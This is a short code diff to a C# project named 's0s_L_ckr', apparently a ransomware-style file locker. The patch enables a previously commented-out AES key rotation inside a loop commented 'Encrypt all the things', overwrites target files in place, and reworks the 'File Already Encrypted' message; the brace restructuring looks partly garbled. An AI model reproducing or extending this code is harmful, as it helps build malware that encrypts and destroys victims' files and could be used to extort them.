@@ -98,7 +98,7 @@ namespace s0s_L_ckr
                 {
                     //Encrypt all the things
                     //Rotate AES Key
-                    //CriptoKeyMgr.RotAesKey();
+                    CriptoKeyMgr.RotAesKey();
 
                     //Reading Data in files
                     Byte[] fileDat = null;
@@ -108,7 +108,7 @@ namespace s0s_L_ckr
                     {
                         //Encrypt File
                         //CriptoFilMgr.EncryptFile(file.FullName);
-                       using (FileStream fileStream = File.OpenWrite(file.FullName))
+                        using (FileStream fileStream = File.OpenWrite(file.FullName))
                         {
                             fileStream.Position = 0;
 
@@ -124,16 +124,12 @@ namespace s0s_L_ckr
                     }
                     catch (UnauthorizedAccessException)
                     {
+                        Console.WriteLine("[+] File Already Encrypted");
                         return;
                     }
-                    }
-                else
-                {
-                    Console.WriteLine("[+] File Already Encrypted");
+
+                    //Console.WriteLine("[+] File Filtr not Allowed");
                 }
-            }
-            {
-                //Console.WriteLine("[+] File Filtr not Allowed");
             }
         }
     }
